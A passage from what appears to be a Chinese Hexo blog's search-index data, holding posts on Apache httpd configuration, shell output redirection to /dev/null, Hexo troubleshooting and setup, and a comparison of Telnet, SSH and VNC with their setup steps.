worker：如果httpd -l列出worker.c，则需要对下面的段进行配置： 12345678&lt;IfModule worker.c&gt; StartServers 2 #启动apache时启动的httpd进程个数。 MaxClients 150 #最大并发连接数。 MinSpareThreads 25 #服务器保持的最小空闲线程数。 MaxSpareThreads 75 #服务器保持的最大空闲线程数。 ThreadsPerChild 25 #每个子进程的产生的线程数。 MaxRequestsPerChild 0 #每个子进程被请求服务多少次后被kill掉。0表示不限制，推荐设置为1000。 &lt;/IfModule&gt; 该模式是由线程来监听客户的连接。当有新客户连接时，由其中的一个空闲线程接受连接。服务器在启动时启动两个进程，每个进程产生的线程数是固定的(ThreadsPerChild决定)，因此启动时有50个线程。当50个线程不够用时，服务器自动fork一个进程，再产生25个线程。 perchild：如果httpd -l列出perchild.c，则需要对下面的段进行配置： 12345678&lt;IfModule perchild.c&gt; NumServers 5 #服务器启动时启动的子进程数 StartThreads 5 #每个子进程启动时启动的线程数 MinSpareThreads 5 #内存中的最小空闲线程数 MaxSpareThreads 10 #最大空闲线程数 MaxThreadsPerChild 2000 #每个线程最多被请求多少次后退出。0不受限制。 MaxRequestsPerChild 10000 #每个子进程服务多少次后被重新fork。0表示不受限制。 &lt;/IfModule&gt; 该模式下，子进程的数量是固定的，线程数不受限制。当客户端连接到服务器时，又空闲的线程提供服务。 如果空闲线程数不够，子进程自动产生线程来为新的连接服务。该模式用于多站点服务器。 3、HTTP返头回信息配置: ServerTokens Prod #该参数设置http头部返回的apache版本信息，可用的值和含义如下： Prod：仅软件名称，例如：apache Major：包括主版本号，例如：apache/2 Minor：包括次版本号，例如：apache/2.0 Min：仅apache的完整版本号，例如：apache/2.0.54 OS：包括操作系统类型，例如：apache/2.0.54（Unix） Full：包括apache支持的模块及模块版本号，例如：Apache/2.0.54 (Unix) mod_ssl/2.0.54 OpenSSL/0.9.7g ServerSignature Off #在页面产生错误时是否出现服务器版本信息。推荐设置为Off 4、持久性连接设置 KeepAlive On #开启持久性连接功能。即当客户端连接到服务器，下载完数据后仍然保持连接状态。 MaxKeepAliveRequests 100 #一个连接服务的最多请求次数。 KeepAliveTimeout 30 #持续连接多长时间，该连接没有再请求数据，则断开该连接。缺省为15秒。 5、别名设置对于不在DocumentRoot指定的目录内的页面，既可以使用符号连接，也可以使用别名。别名的设置如下： 12345678Alias /download/ &quot;/var/www/download/&quot; #访问时可以输入:http://www.custing.com/download/ &lt;Directory &quot;/var/www/download&quot;&gt; #对该目录进行访问控制设置 Options Indexes MultiViews AllowOverride AuthConfig Order allow,deny Allow from all &lt;/Directory&gt; 6、CGI设置123456789# 访问时可以：http://www.clusting.com/cgi-bin/，但是该目录下的CGI脚本文件要加可执行权限ScriptAlias /cgi-bin/ &quot;/mnt/software/apache2/cgi-bin/&quot; &lt;Directory &quot;/usr/local/apache2/cgi-bin&quot;&gt; #设置目录属性 AllowOverride None Options None Order allow,deny Allow from all &lt;/Directory&gt; 7、个人主页的设置 (public_html)123456789101112131415UserDir public_html # 用户的主页存储在用户主目录下的public_html目录下URL # http://www.clusting.com/~bearzhang/file.html # 将读取 /home/bearzhang/public_html/file.html 文件 chmod 755 /home/bearzhang # 使其它用户能够读取该文件。 UserDir /var/html # URL http://www.clusting.com/~bearzhang/file.html # 将读取 /var/html/bearzhang/file.html UserDir /var/www/*/docs # URL http://www.clusting.com/~bearzhang/file.html # 将读取 /var/www/bearzhang/docs/file.html 8、日志的设置(1) 错误日志的设置 ErrorLog logs/error_log #日志的保存位置LogLevel warn #日志的级别 显示的格式日下： 1[Mon Oct 10 15:54:29 2005] [error] [client 192.168.10.22] access to /download/ failed, reason: user admin not allowed access (2) 访问日志设置日志的缺省格式有如下几种： LogFormat “%h %l %u %t “%r” %&gt;s %b “%{Referer}i” “%{User-Agent}i”” combined LogFormat “%h %l %u %t “%r” %&gt;s %b” common #common为日志格式名称 LogFormat “%{Referer}i -&gt; %U” referer LogFormat “%{User-agent}i” agent CustomLog logs/access_log common 格式中的各个参数如下： 123456789%h --客户端的ip地址或主机名 %l --The 这是由客户端 identd 判断的RFC 1413身份，输出中的符号 &quot;-&quot; 表示此处信息无效。 %u --由HTTP认证系统得到的访问该网页的客户名。有认证时才有效，输出中的符号 &quot;-&quot; 表示此处信息无效。 %t --服务器完成对请求的处理时的时间。 &quot;%r&quot; --引号中是客户发出的包含了许多有用信息的请求内容。 %&gt;s --这个是服务器返回给客户端的状态码。 %b --最后这项是返回给客户端的不包括响应头的字节数。 &quot;%{Referer}i&quot; --此项指明了该请求是从被哪个网页提交过来的。 &quot;%{User-Agent}i&quot; --此项是客户浏览器提供的浏览器识别信息。 下面是一段访问日志的实例： 123192.168.10.22 - bearzhang [10/Oct/2005:16:53:06 +0800] &quot;GET /download/ HTTP/1.1&quot; 200 1228 192.168.10.22 - - [10/Oct/2005:16:53:06 +0800] &quot;GET /icons/blank.gif HTTP/1.1&quot; 304 - 192.168.10.22 - - [10/Oct/2005:16:53:06 +0800] &quot;GET /icons/back.gif HTTP/1.1&quot; 304 – 各参数的详细解释，请参阅：http://www.clusting.com/Apache/ApacheManual/logs.html 9、用户认证的配置(1) httpd.conf用户认证配置:1234567AccessFileName .htaccess ......... Alias /download/ &quot;/var/www/download/&quot; &lt;Directory &quot;/var/www/download&quot;&gt; Options Indexes AllowOverride AuthConfig &lt;/Directory&gt; (2) create a password file: /usr/local/apache2/bin/htpasswd -c /var/httpuser/passwords bearzhang (3) configure the server to request a password and tell the server which users are allowed access.1234567vi /var/www/download/.htaccess: AuthType Basic AuthName &quot;Restricted Files&quot; AuthUserFile /var/httpuser/passwords Require user bearzhang #Require valid-user #all valid user 10、虚拟主机的配置(1)基于IP地址的虚拟主机配置1234567891011Listen 80 &lt;VirtualHost 172.20.30.40&gt; DocumentRoot /www/example1 ServerName www.example1.com &lt;/VirtualHost&gt; &lt;VirtualHost 172.20.30.50&gt; DocumentRoot /www/example2 ServerName www.example2.org &lt;/VirtualHost&gt; (2) 基于IP和多端口的虚拟主机配置123456789101112131415161718192021222324Listen 172.20.30.40:80 Listen 172.20.30.40:8080 Listen 172.20.30.50:80 Listen 172.20.30.50:8080 &lt;VirtualHost 172.20.30.40:80&gt; DocumentRoot /www/example1-80 ServerName www.example1.com &lt;/VirtualHost&gt; &lt;VirtualHost 172.20.30.40:8080&gt; DocumentRoot /www/example1-8080 ServerName www.example1.com &lt;/VirtualHost&gt; &lt;VirtualHost 172.20.30.50:80&gt; DocumentRoot /www/example2-80 ServerName www.example1.org &lt;/VirtualHost&gt; &lt;VirtualHost 172.20.30.50:8080&gt; DocumentRoot /www/example2-8080 ServerName www.example2.org &lt;/VirtualHost&gt; (3) 单个IP地址的服务器上基于域名的虚拟主机配置：123456789101112131415161718# Ensure that Apache listens on port 80 Listen 80 # Listen for virtual host requests on all IP addresses NameVirtualHost *:80 &lt;VirtualHost *:80&gt; DocumentRoot /www/example1 ServerName www.example1.com ServerAlias example1.com. *.example1.com # Other directives here &lt;/VirtualHost&gt; &lt;VirtualHost *:80&gt; DocumentRoot /www/example2 ServerName www.example2.org # Other directives here &lt;/VirtualHost&gt; (4) 在多个IP地址的服务器上配置基于域名的虚拟主机：1234567891011121314151617181920Listen 80 # This is the &quot;main&quot; server running on 172.20.30.40 ServerName server.domain.com DocumentRoot /www/mainserver # This is the other address NameVirtualHost 172.20.30.50 &lt;VirtualHost 172.20.30.50&gt; DocumentRoot /www/example1 ServerName www.example1.com # Other directives here ... &lt;/VirtualHost&gt; &lt;VirtualHost 172.20.30.50&gt; DocumentRoot /www/example2 ServerName www.example2.org # Other directives here ... &lt;/VirtualHost&gt; (5) 在不同的端口上运行不同的站点(基于多端口的服务器上配置基于域名的虚拟主机)：12345678910111213141516171819202122232425Listen 80 Listen 8080 NameVirtualHost 172.20.30.40:80 NameVirtualHost 172.20.30.40:8080 &lt;VirtualHost 172.20.30.40:80&gt; ServerName www.example1.com DocumentRoot /www/domain-80 &lt;/VirtualHost&gt; &lt;VirtualHost 172.20.30.40:8080&gt; ServerName www.example1.com DocumentRoot /www/domain-8080 &lt;/VirtualHost&gt; &lt;VirtualHost 172.20.30.40:80&gt; ServerName www.example2.org DocumentRoot /www/otherdomain-80 &lt;/VirtualHost&gt; &lt;VirtualHost 172.20.30.40:8080&gt; ServerName www.example2.org DocumentRoot /www/otherdomain-8080 &lt;/VirtualHost&gt; (6) 基于域名和基于IP的混合虚拟主机的配置:123456789101112131415161718Listen 80 NameVirtualHost 172.20.30.40 &lt;VirtualHost 172.20.30.40&gt; DocumentRoot /www/example1 ServerName www.example1.com &lt;/VirtualHost&gt; &lt;VirtualHost 172.20.30.40&gt; DocumentRoot /www/example2 ServerName www.example2.org &lt;/VirtualHost&gt; &lt;VirtualHost 172.20.30.40&gt; DocumentRoot /www/example3 ServerName www.example3.net &lt;/VirtualHost&gt; 作者：garyond链接：https://www.jianshu.com/p/c36dd3946e74来源：简书","link":"/2020/07/28/Others/Apache%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"title":"2&gt;&amp;1 &gt;&#x2F;dev&#x2F;null &amp; 与&#x2F;dev&#x2F;null 2&gt;&amp;1含义","text":"字段解释 /dev/null 代表空设备文件 &gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt 1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null” 2 表示stderr标准错误 &amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 1&gt;/dev/null 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。 2&gt;&amp;1 接着，标准错误输出重定向等同于 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。 设置不发送邮件方法Linux系统中无论是crontab里面，还是平时使用的命令，经常会碰到”&gt;/dev/null 2&gt;&amp;1”。比如说：在Crontab Job里面，如果不想发送邮件，那么有两种方法: 一、是将MAILTO=””, 设置为空[root@host etc]# cat crontabSHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=””HOME=/ # run-parts01 * * * * root run-parts /etc/cron.hourly02 4 * * * root run-parts /etc/cron.daily22 4 * * 0 root run-parts /etc/cron.weekly42 4 1 * * root run-parts /etc/cron.monthly 二、是将关闭某个命令的输出结果，将其重定向到/dev/null中。1 1 * * * /sbin/ping -c 5 www.linuxidc.com &gt; /dev/null 2&gt;&amp;11 2 * * * /sbin/ping -c 5 www.linuxidc.com &gt; /dev/null 则第一个crontab,即使ping失败，都不会有邮件发出，而第二个crontab,如果ping失败，会在/var/spool/mail目录或/var/spool/clientmqueue目录下生成大量的错误输出提示邮件。 再次理解 &gt;/dev/null 2&gt;&amp;1那么如何理解”&gt;/dev/null 2&gt;&amp;1”，可以拆开来理解: &gt; :重定向，例如 echo “Hello” &gt; /root/1.txt1&gt; stdout:表示标准输出,默认是12&gt; stderr:表示标准错误&amp; :表示等同于,2&gt;&amp;1，表示标准错误重定向，等同于标准输出 /dev/null :表示空设置文件，类似于Win系统中的垃圾箱 因此，“&gt;/dev/null 2&gt;&amp;1”也可以写成“1&gt;/dev/null 2&gt;&amp;1”那么本文标题的语句执行过程为：1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，就是不显示任何信息。2&gt;&amp;1 ：接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。 比如说: command &gt; file 2&gt;file command &gt; file 2&gt;&amp;1 相同点:上面两个命令都可是实现将执行command后的，标准及错误输出重定向到file文件中。 不同点: I/O效率上的差异command 1&gt;file 2&gt;file 这样的写法,stdout和stderr都直接送到file中, file会被打开两次,这样stdout和stderr会互相覆盖,这样写相当使用了FD1和FD2两个同时去抢占file的管道。command 1&gt;file 2&gt;&amp;1 这条命令就将stdout直接送向file, stderr 继承了FD1管道后,再被送往file,此时,file只被打开了一次,也只使用了一个管道FD1,它包括了stdout和stderr的内容。从I/O效率上,前一条命令的效率要比后面一条的命令效率要低,所以在编写shell脚本的时候,最多的时候我们会command 1&gt;file 2&gt;&amp;1 这样的写法， 或 “command &gt;file 2&amp;1”","link":"/2020/02/26/Others/2-1-dev-null-%E4%B8%8E-dev-null-2-1%E5%90%AB%E4%B9%89/"},{"title":"hexo报错总结","text":"1、FATAL can not read a block mapping entry; a multiline key may not be an implicit key at line 9, column 9: 解决方法：在冒号后添加空格。 2、npm install 报错ajv-keywords@2.1.1 requires a peer of ajv@^5.0.0 but none is installed. You must install peer dependencies yourself. 解决：npm install ajv@^5.0.0 3、npm下载过慢1npm config set registry https://registry.npm.taobao.org 4、hexo s报错ERROR Deployer not found: git的问题 解决方式： deploy的type 的github需要改成git npm install hexo-deployer-git –save blog文件夹修改为github项目名称 5、/usr/local/include/node is not writable报错执行brew link –overwrite node 报错 解决方法： 12$ cd /usr/local$ sudo chown -R &lt;your-username&gt;:&lt;your-group-name&gt; * 使用命令： id -g 可以得到group name 6、The “mode” argument must be integer12FATAL Something's wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.htmlTypeError [ERR_INVALID_ARG_TYPE]: The &quot;mode&quot; argument must be integer. Received an instance of Object 解决： hexo版本太高，下载13.0的可以","link":"/2019/10/14/Others/hexo%E6%8A%A5%E9%94%99%E6%80%BB%E7%BB%93/"},{"title":"Telnet、ssh和VNC的区别","text":"三者区别 Telnet**Telnet是进行远程登录的标准协议，它是当今Internet上应用最广泛的协议之一。它把用户正在使用的终 端或计算机变成网络某一远程主机的仿真终端，使得用户可以方便地使用远程主机上的软、硬件资源。 Telnet不像其它服务（如HTTP和FTP等）一样作为独立的守护进程运行，它使用xinetd程序管理，这样不但能提高安全性，而且还能使用xinetd对Telnet服务进行配置管理。 SSHTelnet协议在带来便利性的同时，也带来了许多安全问题，最突出的就是Telnet协议使用明文的方式传送所有的数据（包括账号和口令），数据在传输过程中很容易被入侵者窃听或篡改所以建议使用更安全的其它的服务SSH是目前通常使用的远程管理协议，它是一个在应用程序中提供安全通信的协议，通过SS可以安全地访问服务器，因为SSH基于成熟的公钥加密体系，把所有传输的数据进行加密，保证数据在传输时不被恶意破坏、漏露和篡改。 ssh是基于公钥认证的。 首先由用户生成一对密钥，然后将公钥保存在SSH服务器用户主目录下.ssh子目录中的authorized_keys文件中，私钥保存在本地计算机中，当用户登录时，服务器检查authorized_keys文件是否与用户的私钥对应，如果相符则允许用户登录，否则拒绝用户的登录请求。由于私钥只保存在用户的计算机中，因此入侵者就算得到用户的口令，也不能登录到服务器。 VNCTelnet和SSH服务只能实现基于字符界面的远程控制，利用VNC可以实现图形化的远程控制。VNC是virtual network computing的缩写，也就是虚拟网络计算机，VNC软件由两个部分组成：VNC server和VNC viewer，用户需要将VNC server安装在被控制的计算机上，然后在主控制端执行VNC viewer控制被控制端。可以用如下命令查询VNC服务是否安装rpm -q vnc-server如果没有安装，可以用系统的安装光盘找到vnc-server进行安装，好可以去网上下载进行安装。 Telnet服务详解Telnet服务的安装****Telnet有两个安装包：telnet-server和telnettelnet-server安装包是服务器端的安装包，telnet是客户端的安装包一般系统默认都已经安装了这两个包可以先使用此命令查询：rpm –q telnet-server如果没有安装的话可以把RedHat的安装光盘放进去找到rpm包进行安装，也可以去网上下个安装包进行安装rpm –ivh telnet-server-0.17-31.EL4.2.i386.rpm 启动和停止Telnet服务****Telnet不像其它服务（如HTTP和FTP等）一样作为独立的守护进程运行，它使用xinetd程序管理，这样不但能提高安全性，而且还能使用xinetd对Telnet服务进行配置管理。Telnet服务安装后默认并不会被xinetd启用，可以通过修改文件/etc/xinetd.d/telnet将其启用。编辑文件/etc/xinetd.d/telnet，找到语句disable=yes，将其改为disable=no即可。 Telnet服务的配置 Telnet服务最大连接数可以通过编辑文件/etc/xinetd.d/telnet，在花括号｛｝中添加语句instances=3来配置telnet服务的最大连接数，这里的3指telnet服务同时只允许3个连接。 Telnet服务的端口Telnet服务默认的端口为23，出于安生性考虑，可以更改服务器监听的端口，通过编辑文件/etc/services来修改各个服务的端口，找到telnet选项，修改其数值即可。如要改为2323，即：telnet 2323/tcptelnet 2323/udp Telnet客户端的使用通过telnet命令即可登录如Telnet服务器的IP地址为192.168.1.109在客户端（windows和linux）命令行里输入：telnet 192.168.1.109然后输入用户和口令即可，在这里，系统不允许root用户通过telnet登录，所以这个用户是除root用户的其它用户，登录后可以使用su – 命令切换成root用户，这样就OK了。 SSH配置详解SSH服务的安装****Linux下广泛使用免费的OpenSSH程序来实现SS协议，它同时支持SSH1和SSH2协议Openssh软件包包括两部分：openssh-server和openssh-client，它们分别打包在不同的RPM包中，同时都需要依赖openssh软件包工作，不用说，都能猜到这两个包的用途了吧。可以使用如下命令检查是否已经安装OpenSSHRpm –q openssh-server SSH服务的配置配置SSH服务的运行参数，主要是通过修改配置文件/etc/ssh/sshd_config来实现的，这里面的选项特别多，但大部分都是使用#注释的，这是因为SSH服务使用默认配置已经能够很好的工作了1 设置SSH服务监听的端口号#port 222 设置使用SSH协议的顺序#protocol 2,13 设置SSH服务器绑定的IP地址#listen address 0.0.0.04 设置是否允许root管理员登录#permit rootlogin yes5 设置是否允许空密码用户登录#permit emptypasswords no6 设置是否使用口令认证方式#password authentication yes每次修改配置文件/etc/ssh/sshd_config后，都需要重新启动SSH服务才能使新的配置生效。 启动和停止SSH服务/etc/init.d/sshd start｜stop｜restart｜status SSH客户端的使用 linux客户端在linux客户端，可以使用命令ssh登录，如果SSH服务器的IP地址为192.168.1.109，登录命令如下：ssh 192.168.1.109根据提示输入口令即可，这个口令是root用户的口令，所以登录之后就是root用户身份了。 windows客户端在windows客户端是无法使用ssh命令的，但是有许多SSH客户程序，推荐使用免费的PuTTY程序，它小巧好用，而且是一款无需安装的绿色软件。 连接SSH服务器运行下载的putty.exe文件，在程序主界面中输入服务器的IP地址或域名，在协议中选择SSH选项，然后单击连接按钮即可连接。如果是第一次连接到某台服务器，由于服务器公钥没有在注册表中缓存，putty程序会出现的警告信息并显示服务器的指纹信息，点确定即可。如果成功地连接到SSH服务器，会显示登录信息并提示输入用户名和口令，输入分配的用户名和口令即可。 使用基于公钥的认证首先由用户生成一对密钥，然后将公钥保存在SSH服务器用户主目录下.ssh子目录中的authorized_keys文件中，私钥保存在本地计算机中，当用户登录时，服务器检查authorized_keys文件是否与用户的私钥对应，如果相符则允许用户登录，否则拒绝用户的登录请求。由于私钥只保存在用户的计算机中，因此入侵者就算得到用户的口令，也不能登录到服务器。 在服务器端启用公钥认证**编辑文件/etc/ssh/sshd_config，找到语句passwordauthentication yes ，将其值改为passwordauthentication no即可。 1 windows客户端****产生密钥运行下载的puttygen.exe文件，选择加密的算法，推荐选择ssh-2-RSA算法，然后选择加密的位数，推荐用1024位的，然后点击生成按钮，在产生密钥过程中，为了生成一些随机数，应该随意的移动鼠标，生成密钥后，出于安生性考虑，输入保护私钥的口令。然后分别保存私钥和公钥，例如保存的私钥名为private.ppk，公钥名为public.pub，将私钥保存在本地计算机上，将公钥发送到SSH服务器端的/root/.ssh目录下，即/root/.ssh/public.pub，由于puttygen产生的公钥文件格式与openssh程序使用的格式不兼容，因此还可ssh服务器端对其进行转换，转换命令如下：ssh-keygen -i -f /root/.ssh/public.pub&gt;/root/.ssh/authorized_keys使用此命令之的即可将公钥文件public.pub转换成openssh使用的格式。 连接SSH服务器windows客户端 运行putty程序，在主机名里输入服务器的IP地址或域名，然后选择左边的连接——SSH——认证，在路径里找到保存的私钥文件，然后单击打开按钮进行连接 成功地连接到SSH服务器后，服务器会提示输入登录用户名，如果使用了保护私钥的口令短语，还会提示输入口令短语，登录过程中，不需要输入用户的口令。 linux客户端在linux客户端下，可以使用openssh软件包自带的ssh-keygen程序产生密钥，命令如下：ssh-keygen -t rsa执行后，会提示输入保存的路径和保护私钥的口令短语，默认保存在当前用户主目录下的.ssh子目录中，私钥文件名为id-rsa，公钥文件名为id_rsa.pub然后传输公钥文件到服务器的用户主目录下的.ssh目录下，并改名为authorized_keys即可连接SSH服务器可以直接使用ssh命令连接到ssh服务器如：ssh 192.168.1.109根据提示输入用户名，还有口令短语（如果有的话），即可登录了。 VNC配置详解启动vnc服务启动vnc服务的命令格式为:vncserver : 桌面号，其中桌面号用数字表示，每个用户需要占用一个桌面，如果启动桌面号为1的桌面可以执行如下命令：vncserver ：1vnc服务使用的TCP端口号从5900开始例如桌面号为1，则使用的端口号为5901， 桌面号为2，则使用的端口号为5902， 以此类推，基于java的vnc客户程序web服务TCP端口号从5800开始，即5801、5802，以此类推配置多个桌面号 如果需要多个用户同时连接到VNC，可以多次执行vncserver命令，并将桌面号从：1改为：2、：3，以此类推。使用vncserver命令创建的桌面号会在服务器重新启动后失效，服务器每次启动完都需要重新建立，这样很不方便，可以将它们添加到配置文件/etc/syscofnig/vncserver中，格式为：vncserver=“1：root”vncserver=“2：tom”添加完成后，vnc服务每次启动时都会自动创建这些桌面号。 启动和停止vnc服务可以使用如下命令：service vncserver start｜stop｜restart｜status vnc客户端的配置linux客户端在linux客户端，可以通过安装vnc viewer来动进行连接，安装方法和vnc server相似，安装好之后在附件里打开vnc viewer，输入IP地址或域名和桌面号，单面连接即可进行连接了。 windows客户端在windows客户端，可以通过浏览器直接进行连接，例如vnc服务器的IP地址为192.168.1.109，可以在浏览器里输入IP地址加端口号进行连接：192.168.1.109：5801表示连接ip地址为192.168.1.109的vnc服务器的1号桌面。也可以通过程序进行连接，推荐使用TightVNC程序，它包括了vnc客户和vnc服务器程序。其安装方法比较简单，不再多说了，输入vnc服务器的IP地址或域名和桌面号之后，点击连接，输入访问口令进行登录之后就可以在windows下以图形化的方式远程控制linux了。 转载自：https://www.cnblogs.com/Robin-YB/p/6669455.html","link":"/2019/11/07/Others/Telnet%E3%80%81ssh%E5%92%8CVNC%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"title":"hexo建站系列（一）","text":"目录介绍 hexo安装完毕后目录如下12345678910├── .deploy├── public├── scaffolds├── scripts├── source| ├── _drafts| └── _posts├── themes├── _config.yml└── package.json .deploy：执行hexo deploy命令部署到GitHub上的内容目录 public：执行hexo generate命令，输出的静态网页内容目录 scaffolds：layout模板文件目录，其中的md文件可以添加编辑 scripts：扩展脚本目录，这里可以自定义一些javascript脚本 source：文章源码目录，该目录下的markdown和html文件均会被hexo处理。该页面对应repo的根目录，404文件、favicon.ico文件，CNAME文件等都应该放这里，该目录下可新建页面目录。_drafts：草稿文章_posts：发布文章 themes：主题文件目录 _config.yml：全局配置文件，大多数的设置都在这里 package.json：应用程序数据，指明hexo的版本等信息，类似于一般软件中的关于按钮 Hexo原理就是hexo在执行hexo generate时会在本地先把博客生成的一套静态站点放到public文件夹中，在执行hexo deploy时将其复制到.deploy文件夹中。 Hexo图片路径问题 首先确认_config.yml 中有 post_asset_folder:true。Hexo 提供了一种更方便管理 Asset 的设定：post_asset_folder当您设置post_asset_folder为true参数后，在建立文件时，Hexo会自动建立一个与文章同名的文件夹，您可以把与该文章相关的所有资源都放到那个文件夹，如此一来，您便可以更方便的使用资源。 在hexo的目录下执行npm install https://github.com/CodeFalling/hexo-asset-image --save（需要等待一段时间）。 完成安装后用hexo新建文章的时候会发现_posts目录下面会多出一个和文章名字一样的文件夹。图片就可以放在文件夹下面。结构如下： 12345本地图片测试├── apppicker.jpg├── logo.jpg└── rules.jpg本地图片测试.md 这样的目录结构（目录名和文章名一致），只要使用 ![logo](本地图片测试/logo.jpg) 就可以插入图片。其中[]里面不写文字则没有图片标题。生成的结构为: 12345public/2016/3/9/本地图片测试├── apppicker.jpg├── index.html├── logo.jpg└── rules.jpg 同时，生成的 html 是 &lt;img src=&quot;/2016/3/9/本地图片测试/logo.jpg&quot; alt=&quot;logo&quot;&gt; Hexo 导航菜单栏设置在Hexo里，默认的导航菜单只有Home和Archives两项。 如何添加其他项？ 打开主题里的配置文件：_config.yml 搜索menu 1234menu: Home: / Archives: /archives About: /about 名称：路径 这里名称About的访问路径为about 建立about目录，运行： 1hexo n page &quot;about&quot; 会在source目录里生成一个对应的about目录，该目录下的index.md即为访问所指文件。 Hexo 添加RSS和Sitemap1、使用npm安装插件12npm install hexo-generator-feednmp install hexo-generator-sitemap 2、在配置文件里引用插件123plugins: hexo-generator-sitemap hexo-generator-feed 此时sitemap也已经配置好了，重新生成后直接访问/sitemap.xml即可看到站点地图 3、在导航上添加rss链接在themes 自己所用的主题目录下，打开_config.xml rss: 部分修改为 rss: atom.xml menu中添加 Rss: /atom.xml Hexo-Light添加百度搜索由于hexo默认的为google搜索，对于国内用户很不友好，所以我们改为百度。 修改目录themes/light/layout/_widget/search.js 12345678910&lt;div class=&quot;search&quot;&gt; &lt;form action=&quot;//baidu.com/baidu&quot; method=&quot;get&quot; accept-charset=&quot;utf-8&quot;&gt; &lt;input type=&quot;search&quot; name=&quot;word&quot; results=&quot;0&quot; placeholder=&quot;&lt;%= __('search') %&gt;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;si&quot; value=&quot;&lt;%- config.url.replace(/^https?:\\/\\//, '') %&gt;&quot;&gt; &lt;input name=tn type=hidden value=&quot;bds&quot;&gt; &lt;input name=cl type=hidden value=&quot;3&quot;&gt; &lt;input name=ct type=hidden value=&quot;2097152&quot;&gt; &lt;input name=s type=hidden value=&quot;on&quot;&gt; &lt;/form&gt;&lt;/div&gt; Hexo添加加密功能安装在站点根目录中执行以下命令安装依赖： 1npm install --save hexo-blog-encrypt 在站点配置文件中添加如下字段： _config.ymlencrypt: 123enable: truedefault_abstract: 此文章已被加密，需要输入密码访问。 //首页文章列表中加密文章的默认描述文案default_message: 请输入密码以阅读这篇私密文章。 //文章详情页的密码输入框上的默认描述文案 重启服务器，这个时候可能需要经历较长一段时间的加密过程，请耐心等待，加密完成后刷新页面将会显示密码输入框，输入密码后才能继续访问文章内容。 该功能只会加密文章正文，其他内容如打赏、版权信息、标签等则不会被加密隐藏，这样看起来有点奇怪，所以建议加密文章隐藏掉打赏和版权信息内容。 美化密码输入错误时将会显示浏览器默认告警弹窗，可以使用 sweetalert 来美化错误提示： 其中 ‘-’ 代表去掉该行， ‘+’代表添加该行 在主题自定义布局文件中添加如下代码： themes\\next\\layout_custom\\custom.swig 1&lt;script src=&quot;https://unpkg.com/sweetalert/dist/sweetalert.min.js&quot;&gt;&lt;/script&gt; 如果 custom.swig 文件不存在，需要手动新建并在布局页面中 body 末尾引入 themes\\next\\layout_layout.swig 12345678 ... {% include '_third-party/exturl.swig' %} {% include '_third-party/bookmark.swig' %} {% include '_third-party/copy-code.swig' %}+ {% include '_custom/custom.swig' %} &lt;/body&gt; &lt;/html&gt; 在 node_modules 依赖库中修改 hexo-blog-encrypt 源码： node_modules\\hexo-blog-encrypt\\lib\\blog.encrypt.js 12345678910111213 ... } catch (e) {- alert(decryptionError);+ swal({ + text: &quot;憨批！密码错了!&quot;,+ icon: &quot;error&quot;,+ className: &quot;password-error&quot;,+ timer: 1000, + button: false+ }); console.log(e); } ... 即 1234567swal({ text: &quot;憨批!密码错了！&quot;, icon: &quot;error&quot;, className: &quot;password-error&quot;, timer: 1000, button: false}); 在自定义样式文件中添加如下代码： themes/next/source/css/_custom/custom.styl 123456789//密码错误sweetalert弹框样式修改.swal-overlay { background-color: transparent;}.password-error { box-shadow: 0px 4px 12px rgba(0,0,0,0.15); border-radius: 4px;} 由于是在 node_module 中修改的依赖文件，一旦更新或者重装依赖都会覆盖修改，需要重新修改一遍。 效果展示 报错Unhandled rejection TypeError: Cannot read property ‘toString’ of null 结果：尝试卸载重装，尝试npm audit fix 但是都不行，百度也没有什么好的方法，暂时搁置。 添加分类及标签1、创建“分类”选项1.1 生成“分类”页并添加tpye属性打开命令行，进入博客所在文件夹。执行命令 1$ hexo new page categories 成功后会提示： 1INFO Created: ~/Documents/blog/source/categories/index.md 根据上面的路径，找到index.md这个文件，打开后默认内容是这样的： 1234---title: 文章分类date: 2017-05-27 13:47:40--- 添加type: &quot;categories&quot;到内容中，添加后是这样的： 12345---title: 文章分类date: 2017-05-27 13:47:40type: &quot;categories&quot;--- 保存并关闭文件。 1.2 给文章添加“categories”属性打开需要添加分类的文章，为其添加categories属性。下方的categories: web前端表示添加这篇文章到“web前端”这个分类。注意：hexo一篇文章只能属于一个分类，也就是说如果在“- web前端”下方添加“-xxx”，hexo不会产生两个分类，而是把分类嵌套（即该文章属于 “- web前端”下的 “-xxx ”分类）。 123456---title: jQuery对表单的操作及更多应用date: 2017-05-26 12:12:57categories: - web前端--- 至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了categories: xxx的文章才会被收录到首页的“分类”中。 2、创建“标签”选项2.1 生成“标签”页并添加tpye属性打开命令行，进入博客所在文件夹。执行命令 1$ hexo new page tags 成功后会提示： 1INFO Created: ~/Documents/blog/source/tags/index.md 根据上面的路径，找到index.md这个文件，打开后默认内容是这样的： 1234---title: 标签date: 2017-05-27 14:22:08--- 添加type: &quot;tags&quot;到内容中，添加后是这样的： 12345---title: 文章分类date: 2017-05-27 13:47:40type: &quot;tags&quot;--- 保存并关闭文件。 2.2 给文章添加“tags”属性打开需要添加标签的文章，为其添加tags属性。下方的tags:下方的- jQuery - 表格- 表单验证就是这篇文章的标签了 12345678910---title: jQuery对表单的操作及更多应用date: 2017-05-26 12:12:57categories: - web前端tags:- jQuery- 表格- 表单验证--- 至此，成功给文章添加分类，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了tags: xxx的文章才会被收录到首页的“标签”中。 细心的朋友可能已经发现，这两个的设置几乎一模一样！是的，没错，思路都是一样的。所以我们可以打开scaffolds/post.md文件，在tages:上面加入categories:,保存后，之后执行hexo new 文章名命令生成的文件，页面里就有categories:项了。 